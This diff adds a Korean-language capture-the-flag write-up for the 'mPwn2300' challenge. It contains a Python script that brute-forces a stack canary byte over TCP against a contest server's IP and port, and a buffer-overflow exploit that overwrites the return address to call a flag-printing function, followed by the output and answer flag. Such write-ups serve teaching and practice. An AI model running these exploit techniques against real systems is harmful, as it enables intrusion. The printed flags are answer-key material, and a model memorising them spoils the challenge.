@@ -955,6 +955,117 @@ ISCTF{Jmp to sh311c0de!!}
 
 ## mPwn2300
 
+### 풀이
+
+다음 코드는 스택 카나리의 앞 3바이트를 아는 상태에서 마지막 바이트를 찾는 코드이다.
+
+````
+$ cat brute_new_4.py
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+
+TCP_IP = '45.32.46.195'
+TCP_PORT = 10101
+BUFFER_SIZE = 1024
+
+
+for x in range(0x0, 0x100):
+    start = time.time()
+
+    print('Testing ' + str(x))
+    print('Testing ' + str(x), file=sys.stderr)
+    bf = x.to_bytes(1, byteorder='little')
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((TCP_IP, TCP_PORT))
+
+    print(s.recv(BUFFER_SIZE))
+    req = b'A'*64 # buf
+
+    req += b'\x00\xC7\xBD'
+    req += bf # canary 3rd byte
+
+    s.send(req);
+
+    res = s.recv(BUFFER_SIZE)
+
+    time.sleep(0.1)
+
+    success = True
+    s.setblocking(False)
+    try:
+        s.recv(BUFFER_SIZE)
+    except:
+        success = False
+
+    if (success):
+        print("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " + str(x))
+        print("SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " + str(x), file=sys.stderr)
+
+    s.close()
+
+    end = time.time()
+    print(end - start)
+
+    print()
+````
+
+스택 카나리를 알아냈으면, BOF 공격이 가능하다.
+Payload를 다음과 같이 구성한다.
+
+````
+ied206@TS140  ~/ISCTF/mpwn2300
+$ cat solve.py
+#!/usr/bin/env python3
+
+import socket
+import time
+import sys
+
+TCP_IP = '45.32.46.195'
+TCP_PORT = 10101
+BUFFER_SIZE = 1024
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+
+print(s.recv(BUFFER_SIZE))
+req = b'A'*64 # buf
+req += b'\x00\xC7\xBD\x0B'
+req += b'AAAA'*2
+req += b'\xCB\x87\x04\x08'
+
+s.send(req);
+
+res = s.recv(BUFFER_SIZE)
+print(res)
+res = s.recv(BUFFER_SIZE)
+print(res)
+
+s.close()
+````
+
+handle_client 함수의 스택 프레임은 64바이트 buffer, 4바이트 stack canary, 4바이트 main의 EBP, 4바이트 리턴 어드레스 순으로 구성된다. 따라서 payload를 총 80바이트로 구성하며, 그 중 스택 카나리의 값을 현 프로세스의 카나리 값으로 맞추고 리턴 어드레스의 값을 flag를 표시하는 dead code인 cat_flag 함수의 주소로 설정한다.
+
+이를 실행하면 다음 결과를 얻을 수 있다.
+
+````
+ied206@TS140  ~/ISCTF/mpwn2300
+$ ./solve.py
+b'Input your message : '
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+b'ISCTF{Pork?!Fork!!}\n'
+````
+
+#### Answer flag
+
+````
+ISCTF{Pork?!Fork!!}
+````
+
 ## Misc2000
 
 ## Misc2300
